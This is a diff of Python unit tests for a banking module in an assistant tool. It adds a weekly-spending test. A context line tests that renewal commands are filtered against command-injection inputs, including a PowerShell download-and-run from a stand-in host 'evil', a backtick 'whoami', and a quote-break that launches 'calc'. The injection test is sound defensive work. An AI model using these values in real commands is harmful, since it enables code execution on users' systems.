@@ -184,6 +184,18 @@ class ViewTest(FetchTest):
         self.assertEqual(v["consent"], [{"bank": "Crédit Mutuel", "days_left": None, "renew": 'python -m jarvis bank link "Crédit Mutuel"'}])
         self.assertNotIn("u1", json.dumps(v))
 
+    def test_total_et_depense_de_la_semaine(self):
+        banking.fetch()
+        banking._save(banking.CACHE, {"fetched_at": "2026-10-09T10:00:00+00:00", "accounts": [
+            {"bank": "B", "name": "n", "currency": "EUR", "balance": 100.0, "transactions": [
+                {"date": date.today().isoformat(), "amount": -12.5, "label": "a"},
+                {"date": date.today().isoformat(), "amount": 50.0, "label": "b"},
+                {"date": "2000-01-01", "amount": -99.0, "label": "vieux"}]},
+            {"bank": "C", "name": "n", "currency": "USD", "balance": 5.0, "transactions": [
+                {"date": date.today().isoformat(), "amount": -7.0, "label": "usd"}]}]})
+        v = banking.view()
+        self.assertEqual((v["total"], v["week_spent"]), (100.0, 12.5))
+
     def test_commande_de_renouvellement_filtree(self):
         self.assertEqual(banking.renew_cmd("Trade Republic", "DE"), 'python -m jarvis bank link "Trade Republic" DE')
         for bank, country in (('X$(iwr evil|iex)', "FR"), ("X`whoami`", "FR"), ('X" ; calc', "FR"), ("Banque", "fr;x")):
